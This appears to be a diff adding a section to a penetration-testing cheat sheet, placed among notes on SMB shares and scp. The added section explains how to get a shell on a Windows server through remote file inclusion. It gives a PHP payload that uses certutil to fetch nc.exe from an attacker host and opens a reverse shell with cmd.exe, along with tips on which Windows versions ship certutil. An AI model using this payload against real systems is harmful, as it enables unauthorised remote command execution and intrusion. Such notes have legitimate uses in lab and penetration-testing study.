@@ -48,6 +48,13 @@ impacket-smbserver <share name> <path>
 
 net view \\\\\<ip>
 
+#### Obtaining Shell on a Remote Windows Server RFI 
+1. Create and host your file (in this case, we call our file evil.txt) on your attacking machine-192.168.105.130
+The evilfile.txt contains the php file with windows command for the reverse shell as shown below:
+```shell
+<?php echo shell_exec('certutil.exe -urlcache -split -f "http://192.168.105.130/nc.exe" nc.exe && nc.exe -nv 192.168.105.130 91 -e cmd.exe');?>
+```
+note that our command uses certutil to download netcat (nc.exe). Certutil is not installed by default on XP/Win2003 but is avaialble on the newer windows versions.For XP/2003 you'll need the Admin Tool Pack for windows server 2003
 ### SCP
 After login through ssh
 scp <fileToUpload> user@remote:/path
